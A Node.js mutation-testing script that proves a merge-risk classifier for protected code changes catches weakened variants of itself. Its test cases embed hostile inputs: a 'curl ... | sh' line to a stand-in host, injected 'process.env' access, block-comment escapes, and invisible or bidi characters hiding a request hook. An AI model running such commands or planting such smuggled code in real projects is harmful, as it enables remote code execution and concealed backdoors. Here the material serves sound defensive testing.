// //TR: Bu betik merge-risk sınıflandırıcısı için ağsız mutasyon kanıtıdır (COORD-TRANSITION-AUTONOMY): önce gerçek modüllere karşı kısa bir senaryo takımı (gerçek 4a/4b/#214 diff'leri dahil) tamamen geçmeli; sonra sınıflandırıcıyı zayıflatan her mutant (yasak sözcük düşürme, silinen satırı kabul, çapa denetimini atlama, bölge dışını kabul, eksik içeriği kabul, test silmeyi kabul, yüksek risk kümesini yok sayma, tier'ı min alma, ...) geçici bir kopyada uygulanır ve en az bir senaryo tarafından öldürülmelidir. Mutantın kaynak metni bulunamazsa (kod değişti) kanıt başarısız olur.
// Run: node docs/planning/merge-risk.proof.mjs   (Node >= 22; no network; temp files only). Last line: "MERGE_RISK_PROOF: PASS n/n cases, k/k mutants killed".
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import {fileURLToPath, pathToFileURL} from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, "../..");
const FX = JSON.parse(fs.readFileSync(path.join(ROOT, "tests/support/merge-risk.fixtures.json"), "utf8"));
const PP = JSON.parse(fs.readFileSync(path.join(ROOT, "config/protected-paths.json"), "utf8"));
const SRV = "apps/control-api/src/server.ts", MAIN = "apps/desktop/main.mjs", VAL = "config/validation.json", MAN = "config/trust-root-manifest.json";
const H = t => crypto.createHash("sha256").update(Buffer.from(t, "utf8")).digest("hex");

function applyDiff(base, diff, keep, drop) {
  let lines = base.split("\n");
  const hunks = diff.split("\n").reduce((acc, l) => { if (l.startsWith("@@")) acc.push([]); else if (acc.length && !l.startsWith("\\")) acc[acc.length - 1].push(l); return acc; }, []);
  hunks.forEach((h, i) => {
    if (keep && !keep(i)) return;
    const body = h[h.length - 1] === "" ? h.slice(0, -1) : h;
    const old = body.filter(l => l[0] === " " || l[0] === "-").map(l => l.slice(1)), neu = body.filter(l => l[0] === " " || (l[0] === "+" && !(drop && drop.test(l)))).map(l => l.slice(1));
    const at = lines.findIndex((_, k) => old.every((o, j) => lines[k + j] === o));
    if (at < 0) throw new Error(`HUNK_CONTEXT_NOT_FOUND:${i}`);
    lines = [...lines.slice(0, at), ...neu, ...lines.slice(at + old.length)];
  });
  return lines.join("\n");
}

// ---- The case suite: each case is a boolean over a classifier module R (the real one, or a mutant). ----
const mod = (filename, baseText, headText) => ({filename, status: "modified", baseText, headText});
function suite(R) {
  const C = (files, extra = {}) => R.classifyChange({files, protectedPaths: PP, ...extra});
  const tier = (file, b, h, extra) => C([mod(file, b, h)], extra).files[0]?.tier;
  const s4bB = FX.server4b.base, s4bH = applyDiff(FX.server4b.base, FX.server4b.diff), m4bB = FX.main4b.base, m4bH = applyDiff(FX.main4b.base, FX.main4b.diff);
  const s4aB = FX.server4a.base, s4aR = applyDiff(s4aB, FX.server4a.diff, i => i < 2, /LinuxUnshareSandboxProvider|linux-sandbox-provider/);
  const imp = 'import {registerWidgetStatusRoutes} from "./routes/widget-status.js";';
  const s4aI = s4aR.replace('import {registerRunSummaryRoutes} from "./routes/run-summaries.js";', `import {registerRunSummaryRoutes} from "./routes/run-summaries.js";\n${imp}`);
  const reg = (h, line) => h.replace("registerTaskRoutes(app,laneDeps);", `${line}\nregisterTaskRoutes(app,laneDeps);`);
  const lazy = expr => reg(s4aI, `registerWidgetStatusRoutes(app,{...laneDeps,widgets:()=>${expr}});`);
  const decl = "const WORK_RUN_PRODUCT_RE=/^\\/v1\\/work-runs\\/run_[0-9a-f]{24}\\/product$/;";
  const re = body => m4bH.replace(decl, `const WORK_RUN_PRODUCT_RE=/${body}/;`);
  const v214 = FX.validation214, v214H = applyDiff(v214.base, v214.diff), vObj = JSON.parse(v214.base);
  const vEdit = fn => { const x = structuredClone(vObj); fn(x); return JSON.stringify(x, null, 2); };
  const step = (x, id) => x.steps.find(s => s.id === id);
  const NEW = "tests/zz-new.test.ts";
  const man = (entries, at) => JSON.stringify({schemaVersion: "1.0.0", generatedAt: at, sealStatus: "SEALED", files: entries.map(([p, t]) => ({path: p, sha256: H(t)}))});
  const MB = man([[MAIN, m4bB], [SRV, s4bB]], "t1");
  const bad = s4bH.replace("devruns:()=>getDevRuns()", "devruns:()=>process.env");
  const thin = {exactPaths: ["x"], protectedPrefixes: ["y/"]};
  const LS = String.fromCharCode(0x2028), CR = String.fromCharCode(13), RLO = String.fromCharCode(0x202e);
  const regW = reg(s4aI, "registerWidgetStatusRoutes(app,laneDeps);");
  const core = names => regW.replace(imp, `${imp}\nimport {${names}} from "../../../core/workos/host-process.js";`);
  const post = "function desktopPostPathAllowed(value){", arr = "  /^\\/v1\\/missions\\/msn_[0-9a-f]{24}\\/analysis\\/(?:step|plan)$/,";
  return [
    ["P1 batch 4b server.ts (fee6cef) is PREAUTHORIZED", tier(SRV, s4bB, s4bH) === "PREAUTHORIZED"],
    ["P2 batch 4b main.mjs (fee6cef) is PREAUTHORIZED", tier(MAIN, m4bB, m4bH) === "PREAUTHORIZED"],
    ["P3 batch 4a registrations without the sandbox hook are PREAUTHORIZED", tier(SRV, s4aB, s4aR) === "PREAUTHORIZED"],
    ["P4 batch 4a allow-list hunks are PREAUTHORIZED", tier(MAIN, FX.main4a.base, applyDiff(FX.main4a.base, FX.main4a.diff, i => i < 2)) === "PREAUTHORIZED"],
    ["P5 #214 test insertion known at head is PREAUTHORIZED", tier(VAL, v214.base, v214H, {headFiles: [v214.registered]}) === "PREAUTHORIZED"],
    ["P6 9f0018d append with the test file in the PR is PREAUTHORIZED", C([mod(VAL, FX.validation9f.base, applyDiff(FX.validation9f.base, FX.validation9f.diff)), {filename: FX.validation9f.registered, status: "added"}]).tier === "PREAUTHORIZED"],
    ["P7 reseal of exactly the PREAUTHORIZED files is PREAUTHORIZED", C([mod(SRV, s4bB, s4bH), mod(MAIN, m4bB, m4bH), mod(MAN, MB, man([[MAIN, m4bH], [SRV, s4bH]], "t2"))]).tier === "PREAUTHORIZED"],
    ["P8 routine files are ROUTINE", C([{filename: "apps/control-api/src/routes/w.ts", status: "added"}, {filename: "docs/x.md", status: "modified"}]).tier === "ROUTINE"],
    ["N1 full batch 4a server.ts (sandbox wiring) is FOUNDER", tier(SRV, s4aB, applyDiff(s4aB, FX.server4a.diff)) === "FOUNDER"],
    ["N2 full batch 4a main.mjs (function + QUERY_RULES change) is FOUNDER", tier(MAIN, FX.main4a.base, applyDiff(FX.main4a.base, FX.main4a.diff)) === "FOUNDER"],
    ["N3 process. in a dependency is FOUNDER", tier(SRV, s4aB, lazy("getStore().w(process.exit)")) === "FOUNDER"],
    ["N4 Sandbox in a dependency is FOUNDER", tier(SRV, s4aB, lazy("new LinuxUnshareSandboxProvider()")) === "FOUNDER"],
    ["N4b the same dependency without a deny token passes", tier(SRV, s4aB, lazy("getStore().w(zz)")) === "PREAUTHORIZED"],
    ["N5 a string literal in a dependency is FOUNDER", tier(SRV, s4aB, lazy('getStore()["x"]')) === "FOUNDER"],
    ["N6 a removed server.ts line is FOUNDER", tier(SRV, s4aB, s4aR.replace("registerFlowRoutes(app,laneDeps);\n", "")) === "FOUNDER"],
    // The last code line removed: nothing after it can be mistaken for an addition, so only the purely-additive rule catches it.
    ["N6b the last server.ts line removed (registrations added) is FOUNDER", tier(SRV, s4aB, (() => { const L = s4aR.split("\n"); let k = L.length - 1; while (L[k] === "") k--; L.splice(k, 1); return L.join("\n"); })()) === "FOUNDER"],
    ["N7 a laneDeps key override is FOUNDER", tier(SRV, s4aB, reg(s4aI, "registerWidgetStatusRoutes(app,{...laneDeps,workosPolicy:()=>allowAll()});")) === "FOUNDER"],
    ["N8 a registration outside the registration block is FOUNDER", tier(SRV, s4aB, s4aI.replace(/^(function selectExecutors)/m, "registerWidgetStatusRoutes(app,laneDeps);\n$1")) === "FOUNDER"],
    ["N9 a registration of a route that is not imported is FOUNDER", tier(SRV, s4aB, reg(s4aR, "registerWidgetStatusRoutes(app,laneDeps);")) === "FOUNDER"],
    ["N10 a route registered twice is FOUNDER", tier(SRV, s4aB, reg(reg(s4aI, "registerWidgetStatusRoutes(app,laneDeps);"), "registerWidgetStatusRoutes(app,laneDeps);")) === "FOUNDER"],
    ["N11 a comment that closes a block comment is FOUNDER", tier(SRV, s4aB, reg(reg(s4aI, "registerWidgetStatusRoutes(app,laneDeps);"), "// */ evil()")) === "FOUNDER"],
    ["N12 an allow-list regex without ^ is FOUNDER", tier(MAIN, m4bB, re("\\/v1\\/work-runs\\/run_[0-9a-f]{24}\\/product$")) === "FOUNDER"],
    ["N13 an allow-list regex without $ is FOUNDER", tier(MAIN, m4bB, re("^\\/v1\\/work-runs\\/run_[0-9a-f]{24}\\/product")) === "FOUNDER"],
    ["N14 an allow-list regex with a wildcard is FOUNDER", tier(MAIN, m4bB, re("^\\/v1\\/work-runs\\/.*$")) === "FOUNDER"],
    ["N15 an allow-list regex with flags is FOUNDER", tier(MAIN, m4bB, m4bH.replace(decl, decl.replace("$/;", "$/i;"))) === "FOUNDER"],
    ["N16 a change outside the allow-list region is FOUNDER", tier(MAIN, m4bB, m4bH.replace("// B4-ALLOWLIST-BEGIN", "const x=1;\n// B4-ALLOWLIST-BEGIN")) === "FOUNDER"],
    ["N17 an unknown identifier appended to an allow-list array is FOUNDER", tier(MAIN, m4bB, m4bH.replace(",WORK_RUN_PRODUCT_RE];", ",EXTRA_GET_ROUTES];")) === "FOUNDER"],
    ["N18 reordered allow-list elements are FOUNDER", tier(MAIN, m4bB, m4bH.replace("TASK_DETAIL_RE,TASK_RUNS_RE,", "TASK_RUNS_RE,TASK_DETAIL_RE,")) === "FOUNDER"],
    ["N19 #214 without the head file known is FOUNDER", tier(VAL, v214.base, v214H) === "FOUNDER"],
    ["N20b a test dropped from one step while a new one is added to another is FOUNDER", tier(VAL, v214.base, vEdit(x => { step(x, "tests").command.pop(); step(x, "tests-2").command.push(NEW); }), {headFiles: [NEW]}) === "FOUNDER"],
    ["N20 a test moved between steps is FOUNDER", tier(VAL, v214.base, vEdit(x => { const t = step(x, "tests").command.pop(); step(x, "tests-2").command.push(t); }), {headFiles: [NEW]}) === "FOUNDER"],
    ["N21 a shardPlan change is FOUNDER", tier(VAL, v214.base, vEdit(x => { step(x, "tests-2").command.push(NEW); x.shardPlan.win32.count = 4; }), {headFiles: [NEW]}) === "FOUNDER"],
    ["N22 a reseal covering a FOUNDER-tier file is FOUNDER", C([mod(SRV, s4bB, bad), mod(MAN, MB, man([[MAIN, m4bB], [SRV, bad]], "t2"))]).tier === "FOUNDER"
      && C([mod(SRV, s4bB, bad), mod(MAN, MB, man([[MAIN, m4bB], [SRV, bad]], "t2"))]).files[1]?.tier === "FOUNDER"],
    ["N23 a reseal hash not computed from the head bytes is FOUNDER", C([mod(SRV, s4bB, s4bH), mod(MAN, MB, man([[MAIN, m4bB], [SRV, s4bH + "x"]], "t2"))]).files[1]?.tier === "FOUNDER"],
    ["N24 missing contents are FOUNDER", tier(SRV, null, s4bH) === "FOUNDER" && C([{filename: SRV, status: "modified"}]).tier === "FOUNDER"],
    ["N25 a removed test file is FOUNDER", C([{filename: "tests/v7-b1-workos.test.ts", status: "removed"}]).tier === "FOUNDER"],
    ["N26 a removed protected file is FOUNDER", C([{filename: SRV, status: "removed"}]).tier === "FOUNDER"],
    ["N27 the gate itself is FOUNDER even when protectedPaths does not list it", ["docs/planning/merge-gate.mjs", "core/authority/x.mjs", "tsconfig.json", ".github/CODEOWNERS"].every(f =>
      R.classifyChange({files: [{filename: f, status: "modified"}], protectedPaths: thin}).tier === "FOUNDER")],
    ["N28 a dependency manifest change is FOUNDER", C([{filename: "package.json", status: "modified"}]).tier === "FOUNDER"],
    ["N29 the PR tier is the highest file tier", C([{filename: "docs/x.md", status: "added"}, mod(SRV, s4bB, s4bH), {filename: "package.json", status: "modified"}]).tier === "FOUNDER"],
    ["N30 a malformed entry is FOUNDER", C([{filename: "a.ts", status: "moved"}]).tier === "FOUNDER"],
    ["N31 the canonical matcher is raw startsWith (scripts/validate-role-registry.mjs is protected)", R.pathMatcher(PP).protectedHit("scripts/validate-role-registry.mjs") === true],
    ["N32 a renamed pre-authorized target is FOUNDER", C([{filename: SRV, status: "renamed", previous_filename: "apps/control-api/src/old.ts", baseText: s4bB, headText: s4bH}]).tier === "FOUNDER"],
    // Review round 1 regressions.
    ["N33 a top-level comma in a lazy dependency (extra eager key) is FOUNDER", tier(SRV, s4aB, reg(s4aI, "registerWidgetStatusRoutes(app,{...laneDeps,w:()=>getStore(),orgId:getStore()});")) === "FOUNDER"],
    ["N34 a // @ts-nocheck comment is FOUNDER", tier(SRV, s4aB, `// @ts-nocheck\n${regW}`) === "FOUNDER"],
    ["N35 a U+2028 inside a server.ts comment is FOUNDER", tier(SRV, s4aB, reg(s4aI, `// note${LS}app.addHook("onRequest",async()=>{});\nregisterWidgetStatusRoutes(app,laneDeps);`)) === "FOUNDER"],
    ["N36 a CR inside a main.mjs region comment is FOUNDER", tier(MAIN, m4bB, m4bH.replace(post, `// note${CR}POST_ROUTE_RES.push(/^/);\n${post}`)) === "FOUNDER"],
    ["N37 an import shadowing a global the base never uses (URL) is FOUNDER", !/\bURL\b/.test(s4aB) && tier(SRV, s4aB, core("URL")) === "FOUNDER"],
    ["N37b an import shadowing a name the base uses (getStore) is FOUNDER", tier(SRV, s4aB, core("getStore")) === "FOUNDER"],
    ["N37c a fresh core import name passes", tier(SRV, s4aB, core("hostProcessInfo")) === "PREAUTHORIZED"],
    ["N38 a case-only rename of a registered test is FOUNDER", C([{filename: "tests/V7-b3c-security-stage.test.ts", status: "renamed", previous_filename: "tests/v7-b3c-security-stage.test.ts"}]).tier === "FOUNDER"],
    ["N39 an NTFS alias of a protected file is FOUNDER", C([{filename: "apps/desktop/main.mjs.", status: "added"}]).tier === "FOUNDER"],
    ["N40 a pre-authorized target with status added and contents is FOUNDER", C([{filename: SRV, status: "added", baseText: s4bB, headText: s4bH}]).tier === "FOUNDER"],
    ["N41 a pre-authorized target modified with a previous_filename is FOUNDER", C([{filename: SRV, status: "modified", previous_filename: SRV, baseText: s4bB, headText: s4bH}]).tier === "FOUNDER"],
    ["N42 Object.setPrototypeOf in a dependency is FOUNDER (case-insensitive deny tokens)", tier(SRV, s4aB, lazy("Object.setPrototypeOf(getStore(),zz)")) === "FOUNDER"],
    ["N43 a U+2028 in an allow-list array comment is FOUNDER", tier(MAIN, m4bB, m4bH.replace(arr, `  // note${LS}/^/,\n${arr}`)) === "FOUNDER"],
    ["N44 a // @ts-nocheck line in an allow-list region is FOUNDER", tier(MAIN, m4bB, m4bH.replace(decl, `${decl}\n// @ts-nocheck`)) === "FOUNDER"],
    ["N45 a bidi control in a server.ts comment is FOUNDER", tier(SRV, s4aB, reg(s4aI, `// note ${RLO}x\nregisterWidgetStatusRoutes(app,laneDeps);`)) === "FOUNDER"],
    ["N46 an eslint directive in an allow-list array comment is FOUNDER", tier(MAIN, m4bB, m4bH.replace(arr, `  // eslint-disable-line\n${arr}`)) === "FOUNDER"],
    ["N47 an operator in a dependency is FOUNDER", tier(SRV, s4aB, lazy("getStore().w(!zz)")) === "FOUNDER"],
    // Review round 2 regressions.
    ...(() => {
      const S = (...l) => ['import {registerFlowRoutes} from "./routes/flow.js";', ...l, "const laneDeps={getStore,scope};", "registerFlowRoutes(app,laneDeps);", ""].join("\n");
      const H2 = (span, ins) => S(...span.slice(0, 1), ...ins, ...span.slice(1)).replace("registerFlowRoutes(app,laneDeps);", "registerFlowRoutes(app,laneDeps);\nregisterWidgetRoutes(app,laneDeps);")
        .replace('from "./routes/flow.js";', 'from "./routes/flow.js";\nimport {registerWidgetRoutes} from "./routes/widget.js";');
      const inside = span => tier(SRV, S(...span), H2(span, ["// x; curl -s https://example.invalid/p | sh"]));
      return [
        ["N49 a line inserted inside a multi-line template literal of server.ts is FOUNDER", inside(["const SCRIPT=`#!/bin/sh", "echo start", "`;"]) === "FOUNDER"],
        ["N49b the same change with no multi-line construct in server.ts passes", tier(SRV, S(), H2([], [])) === "PREAUTHORIZED"],
        ["N49c a line inserted inside a backslash string continuation is FOUNDER", inside(["const MSG='a\\", "b';"]) === "FOUNDER"],
        ["N49d a line inserted inside a multi-line block comment is FOUNDER", inside(["/* start", " end */"]) === "FOUNDER"],
        ["N49e a nested template literal left open is FOUNDER", inside(["const T=`a ${`b` + `c", "d`}`;"]) === "FOUNDER"],
        ["N50 a new sandbox implementation beside the existing one (core/agents) is FOUNDER", C([{filename: "core/agents/wsl-sandbox.ts", status: "added"}]).tier === "FOUNDER"
          && C([{filename: "apps/desktop/sandbox-host.mjs", status: "added"}]).tier === "FOUNDER" && C([{filename: "automation/sandbox/x.mjs", status: "added"}]).tier === "FOUNDER"],
        ["N50b other core/agents files and sandbox tests stay ROUTINE", C([{filename: "core/agents/agent-routing.ts", status: "modified"}, {filename: "tests/support/test-sandbox.ts", status: "modified"}]).tier === "ROUTINE"],
      ];
    })(),
    ["N48 a //TR comment in a region and in server.ts passes", tier(MAIN, m4bB, m4bH.replace(decl, `${decl}\n// //TR: yol.`)) === "PREAUTHORIZED"
      && tier(SRV, s4aB, regW.replace(imp, `// //TR: widget.\n${imp}`)) === "PREAUTHORIZED"],
  ];
}

// ---- Mutants: each is one textual change in one module, and must make at least one case fail. ----
const G = "core/authority/protected-change-grammar.mjs", AAE = "core/authority/autonomous-authority.mjs", MR = "docs/planning/merge-risk.mjs";
const MUTANTS = [
  ["drop the process. deny token", G, '["process.", ', "["],
  ["drop both sandbox deny tokens", G, '"sandbox", "Sandbox", ', ""],
  ["skip unknown characters in a dependency expression", G, "if (!p) return null;", "if (!p) { i++; continue; }"],
  ["accept removed or modified lines", G, "return j === baseLines.length ? added : null;", "return added;"],
  ["skip the laneDeps override check", G, 'if (depKeys.has(lazy[2]) || lazy[2] === "app" || lazy[2] === "__proto__") r.push("LANE_DEP_OVERRIDE");', ""],
  ["skip the registration-block check", G, 'if (!(k === deps || REGISTER_ANY_RE.test(head[k]))) r.push("REGISTER_OUTSIDE_BLOCK");', ""],
  ["skip the import check for registrations", G, 'if (!importedRoutes.has(name)) r.push("REGISTER_NOT_IMPORTED");', ""],
  ["skip the duplicate registration check", G, 'if (head.filter(h => h.startsWith(`${name}(`)).length !== 1 || base.some(b => b.startsWith(`${name}(`))) r.push("REGISTER_DUPLICATE");', ""],
  ["allow comments that open or close block comments", G, 'if (BLOCK_COMMENT_RE.test(rest) || /^[/#!]/.test(rest)) return "COMMENT_NOT_IN_GRAMMAR";', 'if (/^[/#!]/.test(rest)) return "COMMENT_NOT_IN_GRAMMAR";'],
  ["skip the ^ anchor", G, "String.raw`^\\^(?:${SEGMENT})+\\$$`", "String.raw`^\\^?(?:${SEGMENT})+\\$$`"],
  ["skip the $ anchor", G, "String.raw`^\\^(?:${SEGMENT})+\\$$`", "String.raw`^\\^(?:${SEGMENT})+\\$?$`"],
  ["accept any regex body", G, "export const pathRegexBodyOk = body => typeof body === \"string\" && body.length <= 200 && PATH_REGEX_BODY.test(body);", "export const pathRegexBodyOk = body => typeof body === \"string\";"],
  ["accept regex flags", G, 'if (!lit || line.slice(lit.end) !== ";") return null;', 'if (!lit || !line.slice(lit.end).endsWith(";")) return null;'],
  ["skip the outside-region check", G, 'if (bo.some((x, k) => x !== ho[k])) r.push("CHANGE_OUTSIDE_ALLOWLIST");', ""],
  ["accept unknown appended identifiers", G, 'if (t.kind === "id" && !newRegex.has(t.text)) r.push("ARRAY_APPENDS_UNKNOWN_IDENTIFIER");', ""],
  ["skip the array prefix check", G, 'if (!be.tokens.every((t, i) => he.tokens[i]?.text === t.text)) { r.push("ARRAY_NOT_APPEND_ONLY"); continue; }', ""],
  ["accept test registrations that drop or move entries", AAE, "return j === a.length ? added : null;", "return added;"],
  ["ignore shardPlan and other non-step changes", AAE, 'if (!deepEqual(bRest, hRest)) reasons.push("NON_STEP_FIELDS_CHANGED");\n    if (!Array.isArray(bs)', 'if (!Array.isArray(bs)'],
  ["accept test files not known at head", AAE, "else if (typeof headFileExists !== \"function\" || headFileExists(t) !== true) reasons.push(`TEST_FILE_NOT_AT_HEAD:${t}`);", ""],
  ["accept reseal hashes not computed from content", AAE, "if (!bytes || sha256(bytes) !== he.sha256) reasons.push(`RESEAL_HASH_NOT_FROM_CONTENT:${he.path}`);", ""],
  ["let the reseal cover FOUNDER-tier files", MR, 'const authorized = second.filter(x => x.tier === "ROUTINE" || x.tier === "PREAUTHORIZED").map(x => x.file);', "const authorized = second.map(x => x.file);"],
  ["treat missing contents as pre-authorized", MR, 'if (!isStr(entry.baseText) || !isStr(entry.headText)) return founder(x.file, "PROTECTED_CONTENT_MISSING");', 'if (!isStr(entry.baseText) || !isStr(entry.headText)) return {file: x.file, tier: "PREAUTHORIZED", code: x.code};'],
  ["accept removed test files", MR, 'if (gone.some(n => TEST_FILE_PATTERN.test(n))) return founder(file, "TEST_FILE_REMOVED");', ""],
  // (Dropping the PROTECTED_PATH_REMOVED check is an equivalent mutant: a removed or renamed protected name is FOUNDER through the protected/high-risk check anyway.)
  ["skip the dependency expression check", G, 'if (!safeExpression(lazy[3])) r.push("DEPENDENCY_EXPRESSION_DENIED");', ""],
  ["ignore the exact entries of protectedPaths", MR, "...pp.exactPaths.map(normPath).filter(Boolean)", ""],
  ["ignore the high-risk set", MR, "export const isHighRisk = n => isStr(n) && (", "export const isHighRisk = n => false && ("],
  ["take the minimum tier", MR, "if (RANK[x.tier] > RANK[tier]) tier = x.tier;", "if (RANK[x.tier] < RANK[tier]) tier = x.tier;"],
  ["use the trust-root boundary matcher for prefixes", MR, "prefixes.some(p => n.startsWith(p))", "prefixes.some(p => n === p.replace(/\\/$/, \"\") || n.startsWith(p.endsWith(\"/\") ? p : `${p}/`))"],
  ["accept renamed pre-authorized targets", MR, 'if (f.status === "modified" && !hasPrev && !ci', 'if (!ci'],
  // Review round 1: each new rule has a mutant that removes it.
  ["skip the line-terminator check in server.ts", G, "const cv = lineCharViolation(l);\n    if (cv) { r.push(cv); continue; }", ""],
  ["skip the line-terminator check in allow-list regions", G, "for (const l of headLines) { const cv = lineCharViolation(l); if (cv) { r.push(cv); return; } }", ""],
  ["treat only CR as a line terminator", G, "const LINE_TERMINATOR_RE = /[\\r\\u2028\\u2029]/;", "const LINE_TERMINATOR_RE = /[\\r]/;"],
  ["accept invisible format characters", G, "\\u007f-\\u009f\\p{Cf}]/u;", "\\u007f-\\u009f]/u;"],
  ["accept tool directives in comments", G, 'return COMMENT_PRAGMA_RE.test(rest) ? "COMMENT_PRAGMA" : null;', "return null;"],
  ["skip the comment check in server.ts", G, 'if (l.startsWith("// ")) { const c = commentViolation(l.slice(2)); if (c) r.push(c); continue; }', 'if (l.startsWith("// ")) continue;'],
  ["skip the comment check on region lines", G, "{ const c = commentViolation(t.trim().slice(2)); if (c) r.push(c); continue; }", "continue;"],
  ["skip the comment check in allow-list arrays", G, "for (const c of he.comments) { const v = be.comments.includes(c) ? null : commentViolation(c.slice(2)); if (v) r.push(v); }", ""],
  ["accept a top-level comma after the lazy expression", G, "return body() && i === t.length;", "return body();"],
  ["match deny tokens case-sensitively", G, "(CASE_SENSITIVE_DENY_TOKENS.includes(t) ? s.includes(t) : l.includes(t.toLowerCase()))", "s.includes(t)"],
  ["skip the import shadowing check", G, 'if (shadows(baseText, n) || bound.has(n)) r.push("IMPORT_SHADOWS_NAME");', ""],
  ["ignore global names when importing", G, "const shadows = (baseText, n) => GLOBAL_NAMES.includes(n) || n in globalThis || usedIn(baseText, n);", "const shadows = (baseText, n) => usedIn(baseText, n);"],
  ["ignore names the base already uses when importing", G, "const shadows = (baseText, n) => GLOBAL_NAMES.includes(n) || n in globalThis || usedIn(baseText, n);", "const shadows = (baseText, n) => GLOBAL_NAMES.includes(n) || n in globalThis;"],
  ["compare renames on normalised names", MR, "f.previous_filename !== file ? [ns[1]] : []", "ns[1] !== ns[0] ? [ns[1]] : []"],
  ["skip the canonical path check", MR, 'if (!isCanonicalPath(file) || (hasPrev && !isCanonicalPath(f.previous_filename))) return founder(file, "FILE_ENTRY_MALFORMED");', ""],
  ["apply content classes to any non-removed status", MR, 'if (f.status === "modified" && !hasPrev && !ci', 'if (f.status !== "removed" && !hasPrev && !ci'],
  // Review round 2: each new rule has a mutant that removes it.
  ["skip the multi-line span guard in server.ts", G, 'if ([...base, ...head].some(serverLineSpans)) return ["SERVER_UNREADABLE"];', ""],
  ["ignore template literals left open", G, "(templateOpenAtEnd(l) || l.endsWith", "(false || l.endsWith"],
  ["ignore nested template literals", G, 'else if (c === "$" && l[i + 1] === "{") { st.push(0); i++; }', ""],
  ["ignore backslash line continuations", G, '(templateOpenAtEnd(l) || l.endsWith("\\\\") ||', "(templateOpenAtEnd(l) ||"],
  ["ignore block comments across lines", G, "|| blockCommentSpans(l));", ");"],
  ["drop the sandbox path pattern", MR, ",\n  /^(?:core|apps|scripts|automation)\\/.*sandbox/]);", "]);"],
  ["apply content classes to entries with a previous_filename", MR, 'if (f.status === "modified" && !hasPrev && !ci', 'if (f.status === "modified" && !ci'],
];
const COPY = [G, AAE, MR, "automation/lib/lease-verdict.mjs", "automation/lib/task-lease.mjs", "automation/lib/atomic-json.mjs"];

let n = 0, caseFail = 0;
const line = (ok, text) => { console.log(`${ok ? "PASS" : "FAIL"} ${text}`); };
const R0 = await import("./merge-risk.mjs");
const base = suite(R0);
for (const [name, ok] of base) { n++; if (!ok) caseFail++; line(ok, name); }
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "merge-risk-mut-"));
let killed = 0;
// The harness itself: an unmutated copy must pass every case, so a killed mutant is killed by its change and not by the copy.
const copyTree = (dir, mutate) => { for (const f of COPY) { const dst = path.join(dir, f); fs.mkdirSync(path.dirname(dst), {recursive: true}); let t = fs.readFileSync(path.join(ROOT, f), "utf8"); if (mutate) t = mutate(f, t); fs.writeFileSync(dst, t); } };
copyTree(path.join(tmp, "control"));
const control = suite(await import(pathToFileURL(path.join(tmp, "control", MR)).href));
const controlOk = control.every(([, ok]) => ok);
n++; if (!controlOk) caseFail++; line(controlOk, "H1 the unmutated copy passes every case");
for (const [i, [name, file, from, to]] of MUTANTS.entries()) {
  const src = fs.readFileSync(path.join(ROOT, file), "utf8");
  const count = src.split(from).length - 1;
  if (count !== 1) { line(false, `MUTANT ${i + 1} ${name}: source text found ${count} times (stale mutant)`); continue; }
  const dir = path.join(tmp, `m${i + 1}`);
  copyTree(dir, (f, t) => (f === file ? t.replace(from, () => to) : t));
  let res;
  try { res = suite(await import(pathToFileURL(path.join(dir, MR)).href)); } catch { res = [["IMPORT_FAILED", false]]; }
  const by = res.filter(([, ok]) => !ok).map(([c]) => c.split(" ")[0]);
  if (by.length && !by.includes("IMPORT_FAILED")) killed++;
  line(by.length > 0 && !by.includes("IMPORT_FAILED"), `MUTANT ${i + 1} ${name}: killed by ${by.join(",") || "nothing"}`);
}
fs.rmSync(tmp, {recursive: true, force: true});
const pass = caseFail === 0 && killed === MUTANTS.length;
console.log(`MERGE_RISK_PROOF: ${pass ? "PASS" : "FAIL"} ${n - caseFail}/${n} cases, ${killed}/${MUTANTS.length} mutants killed`);
process.exit(pass ? 0 : 1);
